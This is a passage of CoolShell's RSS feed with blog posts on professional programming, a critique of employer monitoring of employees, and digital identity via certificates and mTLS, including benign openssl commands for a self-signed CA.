+<p>不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：</p>
+<ul>
+<li><strong>把代码组织设计好，有更好的扩展性</strong>。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？</li>
+<li><strong>你的代码质量是不错的，有不错的文档和注释</strong>。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰</li>
+</ul>
+<h5>6）工作而已，优雅不能当饭吃</h5>
+<p>回应两点：</p>
+<p>其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。</p>
+<p>其二，<strong>作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量</strong>。</p>
+<p><strong>希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！</strong></p>
+<figure id="attachment_22177" aria-describedby="caption-attachment-22177" style="width: 834px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-22177 size-full" src="https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg" alt="" width="834" height="319" srcset="https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg 834w, https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75-300x115.jpeg 300w, https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75-768x294.jpeg 768w, https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75-604x231.jpeg 604w" sizes="(max-width: 834px) 100vw, 834px" /><figcaption id="caption-attachment-22177" class="wp-caption-text">你的工作给你权力，而只有你的行为才会给你尊重</figcaption></figure>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li><li ><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg" alt="MegaEase的远程工作文化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a></li><li ><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg" alt="别让自己“墙”了自己" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22173.html">“一把梭：REST API 全用 POST”</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22173.html/feed</wfw:commentRss>
+			<slash:comments>119</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>谈谈公司对员工的监控</title>
+		<link>https://coolshell.cn/articles/22157.html</link>
+					<comments>https://coolshell.cn/articles/22157.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sat, 12 Feb 2022 07:50:06 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[技术管理]]></category>
+		<category><![CDATA[职场生涯]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22157</guid>
+
+					<description><![CDATA[<p>今天看到微博上有一个热点事件， 是一个关于某公司做的一个监控员工离职倾向的软件，从截图中可以看到员工访问招聘网站的次数，还有投递的简历以及搜索的关建词等等信息，...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22157.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22157.html">谈谈公司对员工的监控</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>今天看到微博上有一个热点事件， 是一个关于某公司做的一个监控员工离职倾向的软件，从截图中可以看到员工访问招聘网站的次数，还有投递的简历以及搜索的关建词等等信息，通过这些信息分析员工的离职倾向。然后我发一个微博，说了一下，我以前工作过的公司无论外国公司还是中国公司都有这样的情况，收到一些人来问我相关的情况，所以，我想还是写篇文章详细地说一下，我对这种事情的看法。</p>
+<p><a href="https://coolshell.cn/wp-content/uploads/2022/02/monitoring.jpeg"><img decoding="async" loading="lazy" class="aligncenter wp-image-22159 size-large" src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-1024x534.jpeg" alt="" width="640" height="334" srcset="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-1024x534.jpeg 1024w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-300x156.jpeg 300w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-768x400.jpeg 768w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-1536x801.jpeg 1536w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-518x270.jpeg 518w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring.jpeg 1920w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
+<p>本文分成下面个部分：</p>
+<ul>
+<li>公司监控员工的技术手段有哪些？</li>
+<li>为什么要监控员工？</li>
+<li>外企和国企有什么不一样？</li>
+<li>我对此事的看法</li>
+</ul>
+<p><span id="more-22157"></span></p>
+<h4>技术手段</h4>
+<p>下面是我经历过的几个手段：</p>
+<p>1）<strong>通过网络嗅探的方式</strong>。也就是说，你只要上了公司的网络，你个人设备上的通讯信息就可以被人以网络抓包+分析的方式进行分析。当然，这样的手段已经不怎么好用了，因为现在的网络基本上都是HTTPS加密的，网络嗅探的方式只能知道你访问了什么IP，对于其中的数据是没有办法知道的。</p>
+<p>2）<strong>通过使用公司提供的软硬件工具</strong>。你使用公司的电子邮箱，浏览器（或是公司的代理服务器），通讯工具（包括语音电话），手机办公应用……等来处理你的个人事宜的时候，必然会被监控。这样，你只需要不要使用公司的软件来处理自己的私事就好了。</p>
+<p>3）<strong>通过安装一个监控程序</strong>。这个是最可怕的了，因为无论你加不加密都没用了。一般来说，你不安装这个程序，你就没有办法连上网络，包括公司内网和外网。这个监控程序，会收集你电脑或手机上能够收集的到的所有的信息，比如，你的网络信息，按键操作，录屏，软件数据……等等。</p>
+<p>4）<strong>办公区监控</strong>。我见过的还有使用摄像头，在会议室中安装声音和视频监控设备，对整个办公区内发生所有的事情进行监控。</p>
+<p><strong>5）通过爬虫。</strong>通过爬虫分析员工的社交平台上的各种言论，包括招聘网站。除了公司需要分布和自己相关的舆情，同样也开始监控员工的行为和价值观等。这已经不是监控隐私信息了……</p>
+<h4>公司监控的目的</h4>
+<p>公司监控的目的最早就是为了防止自己公司内的数据和信息外泄，所以，他们害怕自己的员工访问了什么不合适的网站，或是下载了什么有恶意的软件，或是不小心发错了邮件。另外一些公司也会使用外包人员，所以，对于外部编制的人员更需要有信息泄漏防范的安全需求。当然，也害怕有一些商业间谍或是自己的员工被收买了窃取公司内部的敏感信息。尤其是对于一些本身就是做数据的公司，如我以前呆过的Thomson Reuters，这家公司主要是卖金融数据的，所以，对信息泄漏是非常注重的，其就是需要在员工的电脑上安装监控软件。</p>
+<p>还有一些劳动密集型的工作，比如在Amazon里的仓库里工作的人，公司会监控员工的工作量，以此来评估员工的工作绩效。对于用监控软件来评估程序员的工作量，我到今天仅见过监控外包人员的，在中国，外包人员需要使用甲方的电脑进行签到和签退，以及相关的工作。除了上述的信息安全目前，还能够看到员工的工作时长的情况。</p>
+<p><strong>所以，一般来说，公司监控的目的主要是为了自己的信息安全，还有员工的工作量评估，一般来说，不会涉及员工的隐私</strong>。</p>
+<p>但是，随着收集的数据越来越多，有些公司发现还可以做更多的事，比如，上述的员工离职倾向的分析。<strong>还有一些公司还会收集员工在外网的数据，比如你在社交平台上的各种言论，来分析你对公司的忠诚度和你的价值观取向……</strong>我个人觉得这些已经令人不耻了。</p>
+<h4>外企与国企不同之处</h4>
+<p>我经历过的公司中，外国公司和中国公司都有监控的经历，这里说一下他们的不一样之处。<strong>最大的不一样的地方是，外国公司会让你有知情权，而中国公司则完全没有</strong>。</p>
+<p>我记得我进入Thomson Reuters 公司的时候，公司要求签署一份监控的知情的同意书，其中用中英文写的，就是说，你授权公司监控你的如下这些信息：1）上网记录，2）下载的软件，3）工作电脑，4）公司的座机电话，5）会议室和办公区的语音和视频监控……大概有两页A4纸，然后也说明了这些数据公司仅用于信息安全的风控，不用于个人隐私分析等等……并且会符合法律要求保护员工的这些数据不外泄……这些条款都经得起法律的推敲。这样的协议是需要员工签字的，并且对双方都有法律约束的。</p>
+<p>中国的公司则不会告诉你他们会监控你哪些数据，而这些数据拿来做什么。 我记得我在某公司工作的时候，就有员工发现自己访问自己的gmail的录屏被公司收集后的愤怒……</p>
+<h4>我对此事的看法</h4>
+<p>一方面，我对于公司通过使用监控软件监控员工的行为我是能够理解的，但是，<strong>应该让员工有知情权，并和员工明确一个监控的信息和范围，包括收集的数据的用途和安全措施，以及数据多长时间销毁的协议。</strong>如果没有这个协议的话，我觉得本质上就是一种流氓行为。</p>
+<p>另一方面，针对监控员离职的倾向来说，我实在不知道有什么意义？公司你知道了又能如何呢？你是要找员工作思想工作，还是要给员工更好的待遇，还是直接开掉？<strong>如果你对自己的企业有信心，你就不必担心员工会离开，如果你的企业有问题，你为什么不把心思花在建设自己的企业上来呢？安装这样的监控软件对于企业没有什么帮助，反而只会让你的企业的形象更low……</strong></p>
+<p>再仔细想想，<strong>员工有一万种方法泄漏你公司的信息，无论你怎么监控，只要他想，他总是能够找到方法的，不是么？如何让找到或是培养有职业操守的员工，如何管理自己企业的商业信息，如何建立一个更好的企业文化让员工更有归属感，成为企业的共同体，一同维护共同利益，为企业着想，这不才是公司真正应该干的事吗？！</strong>监控员工充分暴露了这样的企业没有一个好的企业文化，不懂得高级的管理，所以，只能靠监控这样的手段来管理企业了……这样的企业不去也罢了。</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li><li ><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg" alt="MegaEase的远程工作文化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a></li><li ><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg" alt="别让自己“墙”了自己" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22157.html">谈谈公司对员工的监控</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22157.html/feed</wfw:commentRss>
+			<slash:comments>26</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>网络数字身份认证术</title>
+		<link>https://coolshell.cn/articles/21708.html</link>
+					<comments>https://coolshell.cn/articles/21708.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 02 Jan 2022 08:38:13 +0000</pubDate>
+				<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[mTLS]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[TLS]]></category>
+		<category><![CDATA[安全]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=21708</guid>
+
+					<description><![CDATA[<p>这篇文章是《HTTP API 认证授权术》的姊妹篇，在那篇文章中，主要介绍了 HTTP API 认证和授权技术中用到的 HTTP Basic, Digest A...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/21708.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/21708.html">网络数字身份认证术</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium wp-image-21716" src="https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-300x201.png" alt="" width="300" height="201" srcset="https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-300x201.png 300w, https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-768x514.png 768w, https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-404x270.png 404w, https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114.png 800w" sizes="(max-width: 300px) 100vw, 300px" />这篇文章是《<a title="HTTP API 认证授权术" href="https://coolshell.cn/articles/19395.html" target="_blank" rel="noopener">HTTP API 认证授权术</a>》的姊妹篇，在那篇文章中，主要介绍了 HTTP API 认证和授权技术中用到的 HTTP Basic, Digest Access, HMAC, OAuth, JWT 等各种方式，主要是 API 上用到的一些技术，这篇文章主要想说的是另一个话题——身份认证。也就是说，怎么确认这个数据就是这个人发出来的？</p>
+<h4>用户密码</h4>
+<p>要解决这个问题，我们先来看一个最简单的解——使用密码，通常来说，在网络上要证明一个人的身份的话，都需要这个人的一些私密而唯一的东西。比如，像密码这样的东西，很多地方，只要你提供了你的用户名+密码，就可以确定这个人是你（注明：关于密码管理，强密码设定，密码泄漏，密码破解以及密码哄骗不在这篇文章的话题中），也就是说，这个密码是非常私密的事，我们可以假设，这个事全世界只能有当事人一个人知道，所以，当事人得供正确的密码，我们就可以认证这个人了。</p>
+<p>为了加强密码的安全程度，一般会使用 2FA（Two-factor authentication）或 MFA（Multi-factor authentication），双因认证或多因认证，这需要用户提供一个唯一的可信设备，比如用户的手机，然后通过验证手机短信，或是像 <a href="https://en.wikipedia.org/wiki/Google_Authenticator" target="_blank" rel="noopener">Google Authenticator</a>  这样的动态口令来完成。这样的安全级别已经算是比较高了。如果能够再加上经常性的变更密码，那么安全级别就更好了。</p>
+<p><span id="more-21708"></span></p>
+<p>另外，一些公司还使用了生物密码来进行用户的身份验证，比如人脸识别。但是，我个人觉得人脸识别或是生物识别是比较糟糕的方式，因为：</p>
+<ul>
+<li>目前能被验证的生物信息（如人脸和指纹）太容易被别人获得和伪造了。</li>
+<li>这样东西不能被变更和吊销，密码可以被吊销和重置，人脸则不能。</li>
+</ul>
+<h4>密钥对和证书</h4>
+<p>密码可以解决身证认证的问题有很多问题，最重要的一个问题就是，你要把你的密码提供给对方，对方才能验证你的身份。你不可能把你的密码提供给全世界的人吧，这样的话，全世界的人都有你的密码了，那么任何人都能变成你了。所以，用户密码这个事只能存在于权威机构和普通用户之间，不能存在于普遍应用中。所以，这里需要使用更好的解决方案。</p>
+<p>使用 ECC（<a title="Elliptic-Curve Cryptography" href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography" target="_blank" rel="noopener">Elliptic-Curve Cryptography</a>）椭圆曲线密码术，可以通过一个“密钥对”进行非对称加密。这种技术，在对信息进行加密和解密时，使用两个不同的密钥，其中一个用来做加密，另一个做解密。这样一来，我们就可以把其中一个密钥公布出去，称之为公钥，另一个密钥私密地保管好，称之为私钥。</p>
+<p>比如，我用我的私钥加密信息，然后，我把这个私钥所配对的公钥发布给所有人，大家都用公钥解密信息，不用我的公钥你解密不了这个信息。这样一来，就可以保证这个信息是我发出来的，不但保证了信息安全，还完成了身份认证。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21710" src="https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-1024x390.png" alt="" width="640" height="244" srcset="https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-1024x390.png 1024w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-300x114.png 300w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-768x293.png 768w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-604x230.png 604w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_.png 1304w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>这样的现实案例一般用于网站，也就是用户得要知道我访问的这个网站是真实的，不是别人做的。因为 DNS 很容易被 hack，你连上一个不可信的网络，这个网络里的 DNS 把这个网站的 IP 地址解析成什么 就是什么了。但是有了这个加密的机制后，网站把自己的信息加密后连同公钥给到访问者，访问解密后就知道是不是这个网站了。</p>
+<p>但是，这里还是会有一个很严重的问题，那就是中间人攻击。如下图所示：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21712 size-full" src="https://coolshell.cn/wp-content/uploads/2022/01/middle.man_-e1641105543137.png" alt="" width="600" height="252" /></p>
+<p>中间人 Chad 把自己伪装成 Bob 向 Alice 要信息，然后，再伪装成 Alice 对 Bob 说，这就是 Alice 的公钥，于是 Bob 也无法验证是不是 Alice 的公钥，因为公钥里就是一堆乱七八糟的数据，我们完全不能分辨哪个公钥属于 Alice 的。试想，如果我们收到声称属于银行的密钥。我们怎么知道它确实属于你的银行？</p>
+<p>这里的答案就是<strong>使用数字证书</strong>。证书跟我们的身份证非常类似，其需要一个可信机构来颁发和验证的。这个证书机构 CA（Certificate Authority）是一个是大家都相信的权威机构，他用他的人品保证（当然一般会被严格管理和审计），CA 机构同样使用这样的非对称加密的技术来完成颁发和验证的事。下图展示了这一过程。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21713" src="https://coolshell.cn/wp-content/uploads/2022/01/certificate-1024x532.png" alt="" width="640" height="333" srcset="https://coolshell.cn/wp-content/uploads/2022/01/certificate-1024x532.png 1024w, https://coolshell.cn/wp-content/uploads/2022/01/certificate-300x156.png 300w, https://coolshell.cn/wp-content/uploads/2022/01/certificate-768x399.png 768w, https://coolshell.cn/wp-content/uploads/2022/01/certificate-519x270.png 519w, https://coolshell.cn/wp-content/uploads/2022/01/certificate.png 1362w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>说明一下上面这个图：</p>
+<ol>
+<li>为了解决公钥认证的问题的，我们需要一个权威的CA 机构。</li>
+<li>Alice 把自己的信息（姓名、组织，地址，电邮，网址等）和自己的公钥打包成一个 CSR 的文件，发给 CA 机构，</li>
+<li>CA 机构会来找 Alice 做物理世界的认证，如果通过后，就会用自己的机构私钥，把CSR 变成一个签名证书。</li>
+<li>Bob 同学拿到 Alice 的证书，用 CA 机构的公钥解密后，得到 Alice 的公钥</li>
+<li>后面就可以签证 信息是否来自 Alice 了。</li>
+</ol>
+<p>是的，这个过程就是在“套娃”，这种证书机构还可以给下级的证书机构发证，于是就会一层套一层地，形成一个证书链，顶层的叫根证书，你得绝对信任之。对于验证证书真实性的客户端，它需要能够验证链中所有 CA 的签名，这意味着客户端需要访问链中所有 CA 的证书。</p>
+<h4>证书生成过程演示</h4>
+<p>并不是所有的场景都需要向这些大型的 CA 机构申请公钥证书，在任何一个企业，组织或是团体内都可以自己形这样的“小王国”，也就是说，你可以自行生成这样的证书，只需要你自己保证自己的生成证书的私钥的安全，以及不需要扩散到整个互联网。下面，我们用 <code>openssl</code>命令来演示这个过程。</p>
+<p>1）生成 CA 的证书（公钥） <code>ca.crt</code> 和私钥 <code>ca.key</code></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl req -newkey rsa:2048 \
+    -new -nodes -x509 \
+    -days 365 \
+    -out ca.crt \
+    -keyout ca.key \
+    -subj "/C=SO/ST=Earth/L=Mountain/O=CoolShell/OU=HQ/CN=localhost"</pre>
+<p>2)  生成 alice 的私钥</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl genrsa -out alice.key 2048</pre>
+<p>3）生成 Alice 的 CSR &#8211; Certificate Signing Request</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl req -new -key alice.key 365 -out alice.csr \
+    -subj "/C=CN/ST=Beijing/L=Haidian/O=CoolShell/OU=Test/CN=localhost.alice"</pre>
+<p>4）使用 CA 给 Alice 签名证书</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl x509  -req -in alice.csr \
+    -extfile &lt;(printf "subjectAltName=DNS:localhost.alice") \ 
+    -CA ca.crt -CAkey ca.key  \
+    -days 365 -sha256 -CAcreateserial \
+    -out alice.crt</pre>
+<h4>双向认证 mTLS</h4>
+<p>上面，我们说的基本上都是单向认证，大量的场景都是确保用户方访问的是真正的服务方，如：银行，电商网站，等。这样可以保证用户不会被钓鱼网站或是中间人攻击。但是，很多时候，我们也是需要双向认证的。下面是一个典型的场景——微信支付和商户间交互</p>
+<ul>
+<li>用户到商家那边买东西，商家要求用户进行支付。</li>
+<li>用户选择了微信支付，于是，界面从商户侧切到了微信侧</li>
+<li>微信那边支付完成后，商户这边收到微信那边支付完成的通知，于是开始发货。</li>
+</ul>
+<p>这个过程中有件事非常重要——就是微信通知商户支付完成的时候。</p>
+<ul>
+<li>微信得确保通知到的就是用户所支付商户，而不是别个。</li>
+<li>商户也得要能确认，来通知我的就是微信，不是别人。</li>
+</ul>
+<p>一般来说，微信会给商户一个 AppID和一个 AppSerct，用这个来确保是我认证过的商户来调用我，然后，需要商户在自己的系统里填一个回调的 URL，并通过平台设置的 key来做 MD5/HMAC的签名来确保是官方的回调。这都是在《<a title="HTTP API 认证授权术" href="https://coolshell.cn/articles/19395.html" target="_blank" rel="noopener">HTTP API 认证授权术</a>》中提到过的技术，是相对传统的技术。</p>
+<p>如今，<b>mTLS是</b>确保云原生应用程序中服务之间的通信安全的首选协议。 也就是双向认证。</p>
+<p>传统的 TLS 认证过程是：</p>
+<ol dir="auto">
+<li>客户端连接到服务器</li>
+<li>服务器提供其 TLS 证书</li>
+<li>客户端验证服务器的证书</li>
+<li>客户端和服务器通过加密的 TLS 连接交换信息</li>
+</ol>
+<p dir="auto">在 mTLS 中，客户端和服务器都有一个证书，双方都使用他们的公钥/私钥对进行身份验证。与常规 TLS 相比，mTLS 中有额外的步骤来验证双方（以<strong>粗体显示的</strong>额外步骤）：</p>
+<ol dir="auto">
+<li>客户端连接到服务器</li>
+<li>服务器提供其 TLS 证书</li>
+<li>客户端验证服务器的证书</li>
+<li><strong>客户端出示其 TLS 证书</strong></li>
+<li><strong>服务器验证客户端的证书</strong></li>
+<li><strong>服务器授予访问权限</strong></li>
+<li>客户端和服务器通过加密的 TLS 连接交换信息</li>
+</ol>
+<p>mTLS 需要“根”TLS 证书；这我们自己来完成证书颁发机构的职责。授权客户端和服务器使用的证书必须与此根证书相对应。根证书是自签名的，这意味着我们需要自己创建它。（注：此方法不适用于公共 Internet 上的单向 TLS，因为外部证书颁发机构必须颁发这些证书）</p>
+<p>那么，为什么整个互联网上都用了 TLS 了，为什么 不升级一下使用 mTLS？这里有两方面的原因：</p>
+<ul>
+<li>公共互联网上要解决的问题是：A) 确保用户访问到的是正确的网站，而不是钓鱼网站。B）网站传输的内容是安全和私密且不会被篡改的。</li>
+<li>将 TLS 证书分发到所有最终用户设备将非常困难。生成、管理和验证为此所需的数十亿个证书几乎是不可能的任务。</li>
+</ul>
+<p>在较小的范围内，mTLS 对于单个组织非常有用且非常实用，尤其是当这些组织采用零信任方法来确保网络安全时。由于默认情况下零信任方法不信任任何用户、设备或请求，因此组织必须能够在每次尝试访问网络中的任何点时对每个用户、设备和请求进行身份验证。mTLS 通过对用户进行身份验证和设备验证来帮助实现这一目标。</p>
+<p>关于 mTLS，这里有一个我用 Golang 写的示例 &#8211; <a href="https://github.com/haoel/mTLS" target="_blank" rel="noopener">https://github.com/haoel/mTLS</a>，大家可以参考一下。</p>
+<p>P.S. 本文图版中的卡司来自安全圈的标准 Cast，参看<a href="https://en.wikipedia.org/wiki/Alice_and_Bob" target="_blank" rel="noopener"> Alice and Bob</a>。</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
